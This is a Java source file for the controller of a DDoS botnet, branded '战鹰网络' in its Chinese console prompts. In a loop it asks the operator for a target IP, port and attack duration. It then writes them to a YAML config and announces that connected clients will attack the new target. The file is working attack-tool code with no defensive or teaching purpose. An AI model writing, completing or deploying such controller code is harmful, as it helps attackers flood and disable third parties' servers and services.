package com.zhanyingwl.www;

import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.util.*;

public class InputTargetThread extends Thread {
    static String targetHost = Runner.targetHost;
    static String targetPort;
    static Yaml yml = Runner.yml;
    static String path = Runner.path;
    static int attackSecond = Runner.attackSecond;

    @Override
    public void run() { // 这里负责更新yml
        while (true) {
            try {
                Scanner scanner = new Scanner(System.in);
                System.out.println("[+] 战鹰网络 - DDoS 控制端：请输入目标IP ↓");
                targetHost = scanner.nextLine();
                System.out.println("[+] 战鹰网络 - DDoS 控制端：请输入目标端口 ↓");
                targetPort = scanner.nextLine();
                System.out.println("[+] 战鹰网络 - DDoS 控制端：请输入攻击时间 ↓");
                attackSecond = Integer.parseInt(scanner.nextLine());
                System.out.println("[+] 战鹰网络 - DDoS 控制端：目标配置文件已更新。");
                System.out.println("[+] 战鹰网络 - DDoS 控制端：已连接的客户端将对新目标发起攻击！");
                System.out.println("---------------------------------------");

                Calendar calendar = Calendar.getInstance();
                calendar.add(Calendar.SECOND, attackSecond);
                Date endDate = calendar.getTime();

                Map<String, String> writeMap = new HashMap<>();
                writeMap.put("ip", targetHost);
                writeMap.put("port", targetPort);
                writeMap.put("endDate", endDate.toString());
                FileWriter fileWriter = new FileWriter(path, false);
                BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
                yml.dump(writeMap, bufferedWriter);
                bufferedWriter.close();
                fileWriter.close();

            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}